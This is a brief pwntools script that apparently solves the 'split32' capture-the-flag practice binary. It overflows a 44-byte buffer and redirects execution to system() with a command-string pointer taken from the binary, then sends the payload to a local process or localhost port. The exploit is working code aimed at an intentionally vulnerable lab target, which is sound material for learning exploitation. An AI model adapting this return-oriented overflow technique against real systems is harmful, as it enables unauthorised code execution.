from pwn import *

def start():
	global chall
	if args.REMOTE:
		chall = remote('localhost', 1337)
	else:
		chall = elf.process()

context.binary = elf = ELF('./split32')
libc = elf.libc
start()

payload = b'a'  * 44

command = p32(0x0804A030)
system_addr = p32(0x804861A)

payload += system_addr +  command




with open('payload.txt', 'wb') as f:
    f.write(payload + b'\n')

chall.recvuntil(b'> ')
chall.sendline(payload)
t = chall.recvall(timeout = 0.2)
print(t)

